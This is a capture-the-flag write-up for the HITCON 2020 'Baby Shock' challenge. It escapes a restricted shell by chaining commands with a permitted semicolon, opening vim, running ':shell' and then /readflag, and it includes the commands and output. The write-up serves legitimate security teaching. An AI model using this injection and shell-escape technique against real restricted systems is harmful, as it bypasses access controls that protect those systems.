# Baby Shock  
_Category: misc_

## Description  
> `nc 54.248.135.16 1986`

## Short Solution  
```sh  
id ;vim  
exit  
:shell  
/readflag  
```

## Solution

When we connect to the server, we are running in a restricted shell, with very
few commands available to us:  
```sh  
connected!  
welcome to Baby shock, doo, doo, doo, doo, doo, doo!!!  
> help  
> Available Commands:  
pwd ls mkdir netstat sort printf exit help id mount df du find history touch  
>  vim  
> bad command: vim  
```

We can tell that some characters have been blacklisted by using them with a
comment, e.g.:  
```sh  
> id # foo  
> uid=1128 gid=2020  
id # -  
> bad command: id # -  
```

From this we can determine that attacking the programs we are allowed to
access directly is not likely to be fruitful, as all of those programs listed
will require at least a <kbd>-</kbd> character to be exploited.

Instead, attempting to attack the shell itself, it doesn't take long to see
that a <kbd>;</kbd> is allowed:  
```sh  
> id # ;  
> uid=1128 gid=2020  
```

This allows us to run commands outside of the restricted shell:  
```sh  
> id ; hostname  
> uid=1128 gid=2020  
ip-172-31-11-96  
```

Now we just need to find a program that will let us execute commands. This is
slightly complicated due to the way input handling is within the restricted
shell. As a result, attempting to run bash directly does not produce the
desired results:  
```sh  
> id ; bash  
> uid=1128 gid=2020  
whoami  
> bad command: whoami  
```

Instead of attempting to understand these issues, we simply used `vim` to
launch a fully interactive shell. It still required a little coaxing, but by
typing the solution from the beginning of the writeup in the correct order, we
get a fully interactive shell:  
```sh  
> id ; vim  
> uid=1128 gid=2020 groups=2020  
Vim: Warning: Output is not to a terminal  
Vim: Warning: Input is not from a terminal  
exit  
:shell  
/readflag  
hitcon{i_Am_s0_m155_s3e11sh0ck}  
```  

Original writeup (https://github.com/FrenchRoomba/ctf-writeup-HITCON-
CTF-2020/blob/master/baby-shock/README.md).